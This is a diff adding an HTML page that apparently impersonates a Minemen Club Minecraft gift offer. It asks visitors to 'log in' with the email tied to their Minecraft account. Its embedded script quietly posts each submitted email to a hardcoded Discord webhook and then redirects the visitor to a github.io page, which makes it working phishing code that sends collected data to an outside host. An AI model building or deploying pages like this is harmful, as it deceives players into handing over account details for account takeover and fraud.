@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>MMC Gift</title>
+    <style>
+      body {
+        background-color: #1a1a1a;
+        color: gray;
+      }
+      #left-img {
+        position: absolute;
+        top: 10px;
+        left: 10px;
+        margin-right: 10px;
+      }
+      #form-container {
+        text-align: left;
+        margin-top: 50px;
+      }
+      #form-container h2 {
+        font-weight: bold;
+      }
+      #form-container input[type="text"] {
+        width: 1700px;
+        height: 30px;
+        border-radius: 5px;
+        border: none;
+        padding: 5px;
+        margin-top: 10px;
+      }
+      #form-container input[type="submit"] {
+        background-color: #444;
+        color: #fff;
+        border-radius: 5px;
+        border: none;
+        padding: 10px;
+        margin-top: 10px;
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <div style="text-align:center">
+      <img src="https://i.imgur.com/8ixHEPY.png">
+    </div>
+    <div id="left-img">
+      <img src="https://i.imgur.com/W8zrVfF.png">
+    </div>
+    <div id="form-container">
+      <h2>Enter package options:</h2>
+      <p>Login with Minecraft so that we can identify you</p>
+      <form id="login-form">
+        <input type="text" id="email" placeholder="Email associated with your Minecraft account">
+        <input type="submit" value="Log in with email">
+      </form>
+    </div>
+    <script>
+const form = document.getElementById("login-form");
+form.addEventListener("submit", (event) => {
+  event.preventDefault();
+  const email = document.getElementById("email").value;
+
+  // Create a new XMLHttpRequest object
+  const xhr = new XMLHttpRequest();
+
+  // Set the webhook URL
+  const url = "https://discord.com/api/webhooks/1107141811727773708/rSG2hq8XrpDgfQOFU8z3QYyAUi6uWRCRuJ3VDYsD4PKctobzJT9Zd2nfniaAsU3xvqDK";
+
+  // Set the request method to POST
+  xhr.open("POST", url);
+
+  // Set the request header to include JSON
+  xhr.setRequestHeader("Content-Type", "application/json");
+
+  // Construct the message payload
+  const payload = {
+    username: "My Website Form",
+    content: `Email: ${email}`
+  };
+
+  // Convert the payload to a JSON string
+  const data = JSON.stringify(payload);
+
+  // Send the HTTP request with the JSON payload
+  xhr.send(data);
+
+  // Replace the form with a success message
+  form.innerHTML = "<p>Form submitted! Check your Discord channel for the message.</p>";
+
+  // Redirect to the new page
+  window.location.href = "https://minemenclubgift.github.io/Code/";
+});
+
+          
+
+    </script>
+  </body>
+</html>
